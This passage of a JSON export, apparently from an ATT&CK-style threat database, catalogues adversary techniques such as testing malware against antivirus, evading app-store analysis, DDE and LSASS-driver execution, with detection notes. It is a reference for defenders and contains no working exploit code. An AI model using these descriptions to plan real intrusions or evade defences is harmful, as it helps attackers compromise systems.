automatically.","detection":null,"platforms":[]},{"id":14,"name":"T1287 - Analyze data collected","sort_id":0,"external_id":"T1287","external_sub_id":null,"old_external_id":"PRE-T1064","old_external_sub_id":null,"tactic_id":14,"description":"<p>An adversary will assess collected information such as software\/hardware versions, vulnerabilities, patch level, etc.  They will analyze technical scanning results to identify weaknesses in the confirmation or architecture. (Citation: SurveyDetectionStrategies) (Citation: CyberReconPaper) (Citation: RSA-APTRecon) (Citation: FireEyeAPT28)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"This can be done offline after the data has been collected.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Many of the common tools highlight these weaknesses automatically.  Adversary can \"dry run\" against the target using known exploits or burner devices to determine key identifiers of software, hardware, and services.","detection":null,"platforms":[]},{"id":15,"name":"T1294 - Analyze hardware\/software security defensive capabilities","sort_id":0,"external_id":"T1294","external_sub_id":null,"old_external_id":"PRE-T1071","old_external_sub_id":null,"tactic_id":14,"description":"<p>An adversary can probe a victim's network to determine configurations. The configurations may provide opportunities to route traffic through the network in an undetected or less detectable way. (Citation: OSFingerprinting2014)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"This can be done offline after the data has been collected.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Analyze network traffic to determine security filtering policies, packets dropped, etc.","detection":null,"platforms":[]},{"id":17,"name":"T1289 - Analyze organizational skillsets and deficiencies","sort_id":0,"external_id":"T1289","external_sub_id":null,"old_external_id":"PRE-T1066","old_external_sub_id":null,"tactic_id":14,"description":"<p>Analyze strengths and weaknesses of the target for potential areas of where to focus compromise efforts. (Citation: FakeLinkedIn)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"This can be done offline after the data has been collected.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Job postings and hiring requisitions have to be made public for contractors and many times have the name of the organization being supported.  In addition, they outline the skills needed to do a particular job, which can provide insight into the technical structure and organization of a target.","detection":null,"platforms":[]},{"id":104,"name":"T1389 - Identify vulnerabilities in third-party software libraries","sort_id":0,"external_id":"T1389","external_sub_id":null,"old_external_id":"PRE-T1166","old_external_sub_id":null,"tactic_id":14,"description":"<p>Many applications use third-party software libraries, often without full knowledge of the behavior of the libraries by the application developer. For example, mobile applications often incorporate advertising libraries to generate revenue for the application developer. Vulnerabilities in these third-party libraries could potentially be exploited in any application that uses the library, and even if the vulnerabilities are fixed, many applications may still use older, vulnerable versions of the library. (Citation: Flexera News Vulnerabilities) (Citation: Android Security Review 2015) (Citation: Android Multidex RCE)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Partial","detectable_by_common_defenses_explanation":"Open source software has great appeal mostly due to the time savings and that it is free.  However, using this code without assessing it's security is akin to blindly executing third party software.  Companies often do not dedicate the time to appropriately detect and scan for vulnerabilities. The mainstream mobile application stores scan applications for some known vulnerabilities. For example, Google's Android Application Security Improvement Program identifies and alerts developers to vulnerabilities present in their applications from use of the Vungle, Apache Cordova, WebView SSL, GnuTLS, and Vitamio third-party libraries. However, these scans are not likely to cover all vulnerable libraries, developers may not always act on the results, and the results may not be made available to impacted end users of the applications.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Developers commonly use open source libraries such that where an adversary can easily discover known vulnerabilities and create exploits.  It is also generally easy to decompile arbitrary mobile applications to determine what libraries they use, and similarly use this information to correlate against known CVEs and exploit packages.","detection":null,"platforms":[]},{"id":132,"name":"T1291 - Research relevant vulnerabilities\/CVEs","sort_id":0,"external_id":"T1291","external_sub_id":null,"old_external_id":"PRE-T1068","old_external_sub_id":null,"tactic_id":14,"description":"<p>Common Vulnerability Enumeration (CVE) is a dictionary of publicly known information about security vulnerabilities and exposures. An adversary can use this information to target specific software that may be vulnerable. (Citation: WeaponsVulnerable) (Citation: KasperskyCarbanak)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Public source external to the defender's organization.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Using standard headers\/fingerprints from normal traffic, it is often trivial to identify the SW or HW the target is running, which can be correlated against known CVEs and exploit packages.","detection":null,"platforms":[]},{"id":133,"name":"T1290 - Research visibility gap of security vendors","sort_id":0,"external_id":"T1290","external_sub_id":null,"old_external_id":"PRE-T1067","old_external_sub_id":null,"tactic_id":14,"description":"<p>If an adversary can identify which security tools a victim is using they may be able to identify ways around those tools. (Citation: CrowdStrike Putter Panda)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Public source external to the defender's organization.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Requires in-depth research and potentially other intrusions, requires unbounded amount of work to possibly find a return on investment","detection":null,"platforms":[]},{"id":147,"name":"T1292 - Test signature detection","sort_id":0,"external_id":"T1292","external_sub_id":null,"old_external_id":"PRE-T1069","old_external_sub_id":null,"tactic_id":14,"description":"<p>An adversary can test the detections of malicious emails or files by using  publicly available services, such as virus total, to see if their files or emails cause an alert. They can also use similar services that are not openly available and don't publicly publish results or they can test on their own internal infrastructure. (Citation: WiredVirusTotal)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Partial","detectable_by_common_defenses_explanation":"If using a common service like [https:\/\/www.virustotal.com VirusTotal], it is possible to detect.  If the adversary uses a hostile, less well-known service, the defender would not be aware.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Easy to automate upload\/email of a wide range of data packages.","detection":null,"platforms":[]}]},{"id":15,"name":"Test Capabilities","source_name":"PRE_ATT_test-capabilities","sort_id":0,"external_id":"TA0025","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":16,"tactic_id":15},"techniques":[{"id":134,"name":"T1358 - Review logs and residual traces","sort_id":0,"external_id":"T1358","external_sub_id":null,"old_external_id":"PRE-T1135","old_external_sub_id":null,"tactic_id":15,"description":"<p>Execution of code and network communications often result in logging or other system or network forensic artifacts. An adversary can run their code to identify what is recorded under different conditions. This may result in changes to their code or adding additional actions (such as deleting a record from a log) to the code. (Citation: EDB-39007) (Citation: infosec-covering-tracks)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary controls the test and defender likely has no visibility.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Adversary has full control of environment to determine what level of auditing and traces exist on a system after execution.","detection":null,"platforms":[]},{"id":142,"name":"T1393 - Test ability to evade automated mobile application security analysis performed by app stores","sort_id":0,"external_id":"T1393","external_sub_id":null,"old_external_id":"PRE-T1170","old_external_sub_id":null,"tactic_id":15,"description":"<p>Many mobile devices are configured to only allow applications to be installed from the mainstream vendor app stores (e.g., Apple App Store and Google Play Store). An adversary can submit multiple code samples to these stores deliberately designed to probe the stores' security analysis capabilities, with the goal of determining effective techniques to place malicious applications in the stores that could then be delivered to targeted devices. (Citation: Android Bouncer) (Citation: Adventures in BouncerLand) (Citation: Jekyll on iOS) (Citation: Fruit vs Zombies)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"The app store operators (e.g., Apple and Google) may detect the attempts, but it would not be observable to those being attacked.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"An adversary can submit code remotely using throwaway accounts, although a registration fee may need to be paid for each new account (e.g., $99 for Apple and $25 for Google Play Store).","detection":null,"platforms":[]},{"id":143,"name":"T1356 - Test callback functionality","sort_id":0,"external_id":"T1356","external_sub_id":null,"old_external_id":"PRE-T1133","old_external_sub_id":null,"tactic_id":15,"description":"<p>Callbacks are malware communications seeking instructions. An adversary will test their malware to ensure the appropriate instructions are conveyed and the callback software can be reached. (Citation: LeeBeaconing)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary controls the test and defender likely has no visibility.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Adversary controls or acquires all pieces of infrastructure and can test outside of defender's visibility.","detection":null,"platforms":[]},{"id":144,"name":"T1357 - Test malware in various execution environments","sort_id":0,"external_id":"T1357","external_sub_id":null,"old_external_id":"PRE-T1134","old_external_sub_id":null,"tactic_id":15,"description":"<p>Malware may perform differently on different platforms (computer vs handheld) and different operating systems (<a href=\"http:\/\/www.ubuntu.com\">Ubuntu<\/a> vs <a href=\"http:\/\/www.apple.com\/osx\">OS X<\/a>), and versions (<a href=\"http:\/\/windows.microsoft.com\">Windows<\/a> 7 vs 10) so malicious actors will test their malware in the environment(s) where they most expect it to be executed. (Citation: BypassMalwareDefense)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary controls the test and defender likely has no visibility.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Adversary can simulate most environments (e.g., variable operating systems, patch levels, application versions) with details available from other techniques.","detection":null,"platforms":[]},{"id":145,"name":"T1359 - Test malware to evade detection","sort_id":0,"external_id":"T1359","external_sub_id":null,"old_external_id":"PRE-T1136","old_external_sub_id":null,"tactic_id":15,"description":"<p>An adversary can run their code on systems with cyber security protections, such as antivirus products, in place to see if their code is detected. They can also test their malware on freely available public services. (Citation: MalwareQAZirtest)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary controls the testing and can ensure data does not leak with proper OPSEC on testing.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Adversary has the ability to procure products and not have reporting return to vendors or can choose to use freely available services","detection":null,"platforms":[]},{"id":146,"name":"T1360 - Test physical access","sort_id":0,"external_id":"T1360","external_sub_id":null,"old_external_id":"PRE-T1137","old_external_sub_id":null,"tactic_id":15,"description":"<p>An  adversary can test physical access options in preparation for the actual attack. This could range from observing behaviors and noting security precautions to actually attempting access. (Citation: OCIAC Pre Incident Indicators) (Citation: NewsAgencySpy)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Defender often install badging, cameras, security guards or other detection techniques for physical security and monitoring.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Requires a physical presence in the space being entered and increased risk of being detected\/detained (e.g., recorded on video camera)","detection":null,"platforms":[]},{"id":148,"name":"T1361 - Test signature detection for file upload\/email filters","sort_id":0,"external_id":"T1361","external_sub_id":null,"old_external_id":"PRE-T1138","old_external_sub_id":null,"tactic_id":15,"description":"<p>An adversary can test their planned method of attack against existing security products such as email filters or intrusion detection sensors (IDS). (Citation: WiredVirusTotal)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Use of sites like [https:\/\/www.virustotal.com VirusTotal] to test signature detection often occurs to test detection.  Defender can also look for newly added uploads as a precursor to an adversary's launch of an attack.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Current open source technologies and websites exist to facilitate adversary testing of malware against signatures.","detection":null,"platforms":[]}]},{"id":21,"name":"Execution","source_name":"ENTERPRISE_execution","sort_id":0,"external_id":"TA0002","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":16,"tactic_id":21},"techniques":[{"id":159,"name":"T1155 - AppleScript","sort_id":0,"external_id":"T1155","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the <code>osalang<\/code> program.\nAppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. <\/p>\n<p>Adversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python  (Citation: Macro Malware Targets Macs). Scripts can be run from the command-line via <code>osascript \/path\/to\/script<\/code> or <code>osascript -e &quot;script here&quot;<\/code>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":159,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":184,"name":"T1059 - Command and Scripting Interpreter","sort_id":0,"external_id":"T1059","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/004\">Unix Shell<\/a> while Windows installations include the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/003\">Windows Command Shell<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a>.<\/p>\n<p>There are also cross-platform interpreters such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/006\">Python<\/a>, as well as those commonly associated with client applications such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/007\">JavaScript\/JScript<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/005\">Visual Basic<\/a>.<\/p>\n<p>Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in <a href=\"https:\/\/attack.mitre.org\/tactics\/TA0001\">Initial Access<\/a> payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals\/shells.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":184,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":184,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":184,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":227,"name":"T1173 - Dynamic Data Exchange","sort_id":0,"external_id":"T1173","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and\/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.<\/p>\n<p>Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)<\/p>\n<p>Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":227,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":233,"name":"T1106 - Native API","sort_id":0,"external_id":"T1106","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware\/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.<\/p>\n<p>Functionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()<\/code> or GNU <code>fork()<\/code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)<\/p>\n<p>Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers\/abstractions to API functionalities and are designed for ease-of-use\/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)<\/p>\n<p>Adversaries may abuse these native API functions as a means of executing behaviors. Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\">Command and Scripting Interpreter<\/a>, the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \n\nUtilization of the Windows API may involve processes loading\/accessing system DLLs associated with providing called functions (ex: kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal\/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":233,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":233,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":233,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":234,"name":"T1129 - Shared Modules","sort_id":0,"external_id":"T1129","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows <a href=\"https:\/\/attack.mitre.org\/techniques\/T1106\">Native API<\/a> which is called from functions like <code>CreateProcess<\/code>, <code>LoadLibrary<\/code>, etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)<\/p>\n<p>The module loader can load DLLs:<\/p>\n<ul>\n<li>\n<p>via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;<\/p>\n<\/li>\n<li>\n<p>via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);<\/p>\n<\/li>\n<li>\n<p>via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;<\/p>\n<\/li>\n<li>\n<p>via <code>&#x3c;file name=&quot;filename.extension&quot; loadFrom=&quot;fully-qualified or relative pathname&quot;&#x3e;<\/code> in an embedded or external &quot;application manifest&quot;. The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.<\/p>\n<\/li>\n<\/ul>\n<p>Adversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to <code>%SystemRoot%<\/code> and <code>%ProgramFiles%<\/code> directories will protect against module loads from unsafe paths. \n\nCorrelation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":234,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":240,"name":"T1203 - Exploitation for Client Execution","sort_id":0,"external_id":"T1203","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.<\/p>\n<p>Several types exist:<\/p>\n<h3>Browser-based Exploitation<\/h3>\n<p>Web browsers are a common target through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1189\">Drive-by Compromise<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\/002\">Spearphishing Link<\/a>. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.<\/p>\n<h3>Office Applications<\/h3>\n<p>Common office and productivity applications such as Microsoft Office are also targeted through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\">Phishing<\/a>. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.<\/p>\n<h3>Common Third-party Applications<\/h3>\n<p>Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https:\/\/attack.mitre.org\/techniques\/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":240,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":240,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":240,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":256,"name":"T1061 - Graphical User Interface","sort_id":0,"external_id":"T1061","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1076\">Remote Desktop Protocol<\/a>, instead of through a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\">Command-Line Interface<\/a>, to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":256,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":256,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":256,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":283,"name":"T1177 - LSASS Driver","sort_id":0,"external_id":"T1177","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)<\/p>\n<p>Adversaries may target lsass.exe drivers to obtain execution and\/or persistence. By either replacing or adding illegitimate drivers (e.g., <a href=\"https:\/\/attack.mitre.org\/techniques\/T1073\">DLL Side-Loading<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1038\">DLL Search Order Hijacking<\/a>), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":283,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":320,"name":"T1086 - PowerShell","sort_id":0,"external_id":"T1086","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a 